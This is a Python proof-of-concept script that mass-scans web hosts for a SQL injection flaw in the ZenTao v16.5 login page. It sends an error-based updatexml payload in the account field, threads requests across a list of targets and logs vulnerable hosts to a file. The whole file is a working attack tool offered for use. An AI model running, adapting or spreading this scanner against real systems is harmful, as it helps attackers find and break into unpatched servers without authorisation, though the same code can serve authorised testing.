import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="禅道 v16.5 存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
    
def poc(target):
    payload_url = '/zentao/user-login.html'   
    url = target + payload_url
    data={"account":"admin' and  updatexml(1,concat(0x1,user()),1) and '1'='1","password":"65270be4586bc80a9472e4b215c6007c","passwordStrength":0,"referer":"%2Fzentao%2F","verifyRand":1077955870,"keepLogin":0,"captcha":""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", 
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate", 
        "Referer": "", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Requested-With": "XMLHttpRequest", 
        "Connection": "close", "Sec-Fetch-Site": "same-origin"}
    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if "XPATH syntax error" in res:
            print(f"[+]该url:{target}存在SQL注入漏洞")
            with open('result.txt','w',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()